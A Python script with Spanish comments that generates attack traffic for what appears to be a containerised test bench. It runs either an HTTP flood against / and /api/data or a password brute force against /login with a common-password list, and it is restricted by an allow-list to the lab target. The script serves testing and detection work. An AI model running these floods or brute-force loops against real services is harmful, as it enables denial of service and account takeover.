"""Generador de carga HTTP que corre DENTRO de los contenedores atacantes del banco de pruebas.

Solo permite como destino el servicio objetivo del compose.
  --mode flood       inundación L7 (GET / y /api/data) -> DDoS
  --mode bruteforce  intentos de contraseña contra POST /login
"""
import argparse
import asyncio
import random
import string
import time

import aiohttp

ALLOWED_HOSTS = ("http://target:8000", "http://172.28.0.10:8000")
WORDLIST = ["123456", "password", "admin", "qwerty", "letmein", "welcome", "abc123", "111111", "iloveyou", "root"]


async def flood_worker(session, target, deadline, stats):
    while time.time() < deadline:
        path = "/" if random.random() < 0.7 else "/api/data"
        try:
            async with session.get(target + path) as r:
                await r.read()
                stats["ok" if r.status < 400 else "err"] += 1
        except Exception:
            stats["err"] += 1


async def brute_worker(session, target, deadline, stats):
    while time.time() < deadline:
        pw = random.choice(WORDLIST) if random.random() < 0.3 else "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        try:
            async with session.post(target + "/login", json={"username": "admin", "password": pw}) as r:
                await r.read()
                stats["ok" if r.status < 400 else "err"] += 1
        except Exception:
            stats["err"] += 1


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode", choices=["flood", "bruteforce"], required=True)
    ap.add_argument("--target", default="http://target:8000")
    ap.add_argument("--concurrency", type=int, default=100)
    ap.add_argument("--duration", type=int, default=300)
    a = ap.parse_args()
    if a.target not in ALLOWED_HOSTS:
        raise SystemExit("Destino no permitido: solo el objetivo del banco de pruebas")
    worker = flood_worker if a.mode == "flood" else brute_worker
    stats = {"ok": 0, "err": 0}
    deadline = time.time() + a.duration
    conn = aiohttp.TCPConnector(limit=0)
    async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=5)) as s:
        await asyncio.gather(*[worker(s, a.target, deadline, stats) for _ in range(a.concurrency)])
    print(stats, flush=True)


if __name__ == "__main__":
    asyncio.run(main())
